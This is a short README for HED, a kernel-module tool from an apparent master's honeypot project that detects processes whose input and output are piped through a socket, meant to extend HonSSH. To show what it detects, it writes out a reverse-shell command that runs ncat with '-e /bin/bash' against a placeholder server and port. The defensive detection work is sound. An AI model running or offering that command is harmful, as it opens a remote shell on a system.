# HED

<p align="center">
	<img alt="Logo" src="./doc/HEDLogo.png" height="220" width="220">
 </p>

HED is a tool developed for detecting when an "engage" is performed. What is an engage? Well... we are refer as "engage" to the procedure of multiplexing the input & output of a child process through a socket. For example: if you execute the following command:

	ncat server port -e /bin/bash

An engage to the server:port executing an instance of *BASH* is performed.

HED needs another party, contained inside the directory *Handler*, who receives the information related to the engage (i.e. IP Address & TCP Port) so it captures the traffic of this stream.

This is useful in certain environments. Our motivation is to enhance the functionality of the software *HonSSH*:

	https://github.com/tnich/honssh

All this project is part of a project of a master, implementing a Honeypot; I am opened to questions and suggestions.
It is important to note that it is necessary to modify the Linux kernel before adding the kernel module... This is not very flexible... maybe I will implement a new version "ALL-IN-ONE" in a future.

The modifies files are the following:

	sched.h
	fork.c
	exit.c

The base Linux kernel version we have used is 4.1.18; but it can work in a large number of versions.

Fernando Vañó
